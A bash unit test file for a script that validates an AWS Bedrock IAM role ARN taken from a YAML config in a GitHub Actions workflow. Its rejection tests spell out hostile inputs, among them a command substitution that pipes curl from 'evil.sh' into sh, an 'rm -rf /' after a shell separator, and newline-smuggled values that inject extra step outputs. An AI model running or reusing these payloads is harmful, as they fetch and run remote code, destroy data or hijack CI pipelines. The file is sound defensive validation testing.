#!/usr/bin/env bash
#
# Copyright (c) 2011-present Sonatype, Inc. All rights reserved.
# Includes the third-party code listed at http://links.sonatype.com/products/clm/attributions.
# "Sonatype" is a trademark of Sonatype, Inc.
#
# resolve-bedrock-role_test.sh — unit tests for scripts/resolve-bedrock-role.sh (GUIDE-3302).
#
# resolve-bedrock-role.sh guards its main() behind a BASH_SOURCE check, so this test sources it
# and drives resolve_bedrock_role() directly with config fixtures.
#
# The accept/reject cases mirror the CLI's schema tests
# (agentic-patches-ts/tests/config/schema.test.ts) on purpose: both sides validate the same
# value, and they must not drift.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=/dev/null
source "${SCRIPT_DIR}/resolve-bedrock-role.sh"

# The script parses YAML with python3 + PyYAML (as .github/workflows/test.yml already does).
# Assert it up front: without it the script correctly hard-fails on a configured role, which
# would show up here as a pile of confusing diffs rather than one clear message.
if ! python3 -c 'import yaml' >/dev/null 2>&1; then
  echo "resolve-bedrock-role_test.sh: SKIPPED - python3 PyYAML is required" >&2
  echo "  install with: python3 -m pip install pyyaml" >&2
  exit 1
fi

TMPDIR_TEST="$(mktemp -d)"
trap 'rm -rf "${TMPDIR_TEST}"' EXIT

fail=0
check() {
  local desc="$1" expected="$2" actual="$3"
  if [ "${expected}" = "${actual}" ]; then
    echo "PASS - ${desc}"
  else
    echo "FAIL - ${desc}"
    echo "  expected: [${expected}]"
    echo "  actual:   [${actual}]"
    fail=1
  fi
}

# write_config <contents> -> path
# Uses a counter rather than mktemp: a suffix after the X's is not portable (BSD mktemp
# rejects it), and every fixture needs a distinct file.
_cfg_seq=0
write_config() {
  _cfg_seq=$((_cfg_seq + 1))
  local f="${TMPDIR_TEST}/agp-${_cfg_seq}.yml"
  printf '%s\n' "$1" >"${f}"
  printf '%s' "${f}"
}

# run_resolve <contents> -> stdout of resolve_bedrock_role (stderr suppressed)
run_resolve() {
  local cfg
  cfg="$(write_config "$1")"
  resolve_bedrock_role "${cfg}" 2>/dev/null || echo "__EXIT_NONZERO__"
}

# ── Applicable: bedrock + valid role ────────────────────────────────────────────
check "emits role and region for a governed bedrock role" \
  "role=arn:aws:iam::123456789012:role/agp-bedrock
region=us-west-2" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock
  awsRegion: us-west-2')"

check "emits role without region when awsRegion is absent" \
  "role=arn:aws:iam::123456789012:role/agp-bedrock" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock')"

check "accepts a role with a path" \
  "role=arn:aws:iam::123456789012:role/team/sub/agp" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/team/sub/agp')"

check "accepts the govcloud partition" \
  "role=arn:aws-us-gov:iam::123456789012:role/agp" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws-us-gov:iam::123456789012:role/agp')"

check "trims surrounding whitespace" \
  "role=arn:aws:iam::123456789012:role/agp" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "  arn:aws:iam::123456789012:role/agp  "')"

# ── Not applicable: emit nothing, exit 0 ────────────────────────────────────────
check "emits nothing for the anthropic provider" "" \
  "$(run_resolve 'agent:
  provider: anthropic
  awsRole: arn:aws:iam::123456789012:role/agp')"

check "emits nothing when provider is unset (CLI default is anthropic)" "" \
  "$(run_resolve 'agent:
  awsRole: arn:aws:iam::123456789012:role/agp')"

check "emits nothing when awsRole is absent" "" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRegion: us-west-2')"

check "treats an empty awsRole as unset (renderer emits empty scalars)" "" \
  "$(run_resolve "agent:
  provider: bedrock
  awsRole: ''
  awsRegion: us-west-2")"

check "emits nothing when there is no agent block at all (agentic mode off)" "" \
  "$(run_resolve 'version: "1"
validation:
  enabled: true')"

check "emits nothing for an empty config" "" "$(run_resolve '')"

check "emits nothing when agent is not a mapping" "" \
  "$(run_resolve 'agent: "yes"')"

check "emits nothing when awsRole is not a string" "" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: 12345')"

check "does not fail on malformed YAML" "" \
  "$(run_resolve 'agent: [unclosed')"

check "does not fail when the config file is missing" "" \
  "$(resolve_bedrock_role "${TMPDIR_TEST}/definitely-absent.yml" 2>/dev/null)"

# ── Invalid ARN: must fail loudly rather than pass a bad value onward ───────────
for bad in \
  'agp-bedrock' \
  'arn:aws:iam::123456789012:user/bob' \
  'arn:aws:iam::123456789012:instance-profile/p' \
  'arn:aws:iam::12345:role/r' \
  'env:AWS_ROLE_TO_ASSUME'; do
  check "rejects invalid ARN [${bad}]" "__EXIT_NONZERO__" \
    "$(run_resolve "agent:
  provider: bedrock
  awsRole: '${bad}'")"
done

# GitHub Actions expression syntax is never expanded here — agp.yml is data fetched at run
# time, not workflow YAML — so it must be rejected rather than passed through literally.
# shellcheck disable=SC2016  # the ${{ }} must stay literal: it is the value under test
check "rejects a GitHub Actions expression" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "${{ secrets.AWS_ROLE_TO_ASSUME }}"')"

# Command substitution / separators must never reach the assume-role input. The value is only
# ever written to GITHUB_OUTPUT (never interpolated into a run: block), but rejecting it here
# is defence in depth for the GUIDE-2953 class of bug.
# shellcheck disable=SC2016  # the $(...) must stay literal: it is the injection attempt
check "rejects command substitution in the role" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r$(curl evil.sh|sh)"')"

check "rejects a shell separator in the role" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r; rm -rf /"')"

check "rejects a newline-smuggled second value" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\narn:aws:iam::999999999999:role/evil"')"

# A multi-line value must be rejected outright, not truncated to its first line: GITHUB_OUTPUT
# is newline-delimited KEY=VALUE, so emitting one would let a hostile config inject additional
# step outputs.
check "rejects a role containing a real newline (GITHUB_OUTPUT injection)" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\ninjected=1"')"

check "rejects a role containing a carriage return" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\rinjected=1"')"

check "rejects a role containing a tab" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\tx"')"

# ── Drift guard against the CLI ─────────────────────────────────────────────────
# The regex here must stay equivalent to IAM_ROLE_ARN_RE in
# agentic-patches-ts/src/config/schema.ts. This asserts the shape rather than the exact text,
# since one is ERE and the other JavaScript.
pattern_anchored() {
  case "${IAM_ROLE_ARN_RE}" in
    '^'*'$') echo anchored ;;
    *) echo unanchored ;;
  esac
}
pattern_has_account_id() {
  case "${IAM_ROLE_ARN_RE}" in
    *'[0-9]{12}'*) echo present ;;
    *) echo missing ;;
  esac
}
check "ARN pattern is anchored at both ends" "anchored" "$(pattern_anchored)"
check "ARN pattern requires a 12-digit account id" "present" "$(pattern_has_account_id)"

if [ "${fail}" -ne 0 ]; then
  echo "resolve-bedrock-role_test.sh: FAILURES"
  exit 1
fi
echo "resolve-bedrock-role_test.sh: all tests passed"
